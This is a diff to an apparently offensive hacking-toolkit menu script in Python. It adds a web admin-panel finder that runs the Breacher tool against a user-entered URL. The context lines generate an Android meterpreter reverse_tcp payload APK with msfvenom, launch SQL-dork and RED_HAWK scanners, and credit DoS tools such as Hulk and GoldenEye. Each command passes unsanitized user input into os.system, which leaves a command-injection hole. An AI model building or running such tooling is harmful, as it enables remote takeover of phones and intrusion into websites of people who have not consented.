@@ -51,7 +51,8 @@ def help():
  start webhacking or webhacking
  start port forwarding or port forward
  create payload  or payload
- 
+ adminfind or adminfinder or crawler
+
  Tools
 
  install stark2.0 or stark2.0 (soon....)
@@ -83,7 +84,7 @@ def webhack():
   #################################
   1. Red_Hawk
   2. SQL Dork
-  more tools are comming soon
+  3. Web Admin Finder
   #################################
   """, "green"))
  web = raw_input("webh > ")
@@ -91,6 +92,8 @@ def webhack():
   os.system("cd modules/RED_HAWK && php rhawk.php")
  elif web == "2":
   sqldork()
+ elif web == "3":
+  webadm()
 
 def portforward():
  print(colored("""
@@ -120,6 +123,11 @@ def payload():
   l2 = raw_input("port > ")
   os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ l1 +" LPORT="+ l2 +" R > /sdcard/payload.apk")
   print(colored("""payload save in sdcard payload.apk""", "green"))
+
+def webadm():
+  print(colored("""Enter Website Url""", "green"))
+  web1 = raw_input("url > ")
+  os.system("cd modules/Breacher && python2 breacher.py -u "+ web1 +" --fast")
 
 def sqldork():
   os.system("cd modules/SCANNER-INURLBR/ && bash sql.sh")
@@ -218,6 +226,7 @@ def credit():
   TorsHammer		TheLinuxChoice
   Hulk			Grafov
   GoldenEye		Jseidl
+  Breacher(admin_f)	s0md3v
   ####################################
   """, "green"))
 
